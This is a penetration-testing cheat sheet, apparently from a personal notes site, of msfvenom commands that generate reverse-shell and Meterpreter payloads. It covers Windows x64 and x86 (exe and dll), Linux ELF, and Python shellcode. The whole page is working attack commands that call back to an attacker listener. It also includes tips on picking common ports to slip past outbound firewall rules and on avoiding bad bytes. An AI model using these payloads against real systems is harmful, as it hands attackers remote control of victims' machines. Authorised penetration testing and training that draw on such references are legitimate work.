---
title: "Metasploit Shellcode"
date: 2024-6-26
tags: ["metasploit", "shellcode", "revshell", "msfconsole", "msfvenom"]
---

### Generate Shellcode

<small>*Note: stageless payload can catch with nc directly*</small>

#### Windows x64

{{< tab set1 tab1 active >}}Staged exe{{< /tab >}}
{{< tab set1 tab2 >}}Stageless exe{{< /tab >}}
{{< tab set1 tab3 >}}Staged dll{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```console
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```console
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.dll
```

</div>

{{< /tabcontent >}}

#### Windows x86

{{< tab set2 tab1 active >}}Staged exe{{< /tab >}}
{{< tab set2 tab2 >}}Stageless exe{{< /tab >}}
{{< tabcontent set2 tab1 >}}

<div>

```console
# Staged
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe
```

</div>

{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

<div>

```console
# Stageless
msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> EXITFUNC=thread > rev.exe
```

</div>

{{< /tabcontent >}}

<small>*Note: These will be flagged by AV*</small>
<br>
<small>*Note: Try to use common ports such as 53, 80, <LOCAL_PORT> to bypass firewall outbound rules*</small>

#### Linux amd64

{{< tab set3 tab1 active >}}Stageless elf{{< /tab >}}
{{< tabcontent set3 tab1 >}}

<div>

```console
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f elf > rev.elf
```

</div>

{{< /tabcontent >}}

#### Others

{{< tab set4 tab1 active >}}Staged python{{< /tab >}}
{{< tabcontent set4 tab1 >}}

<div>

```console
# Generate shellcode in python format and avoid specific bytes
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f python -v shellcode --platform windows -b'\x00\x0a\0d' LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT>
```

</div>

{{< /tabcontent >}}

<br>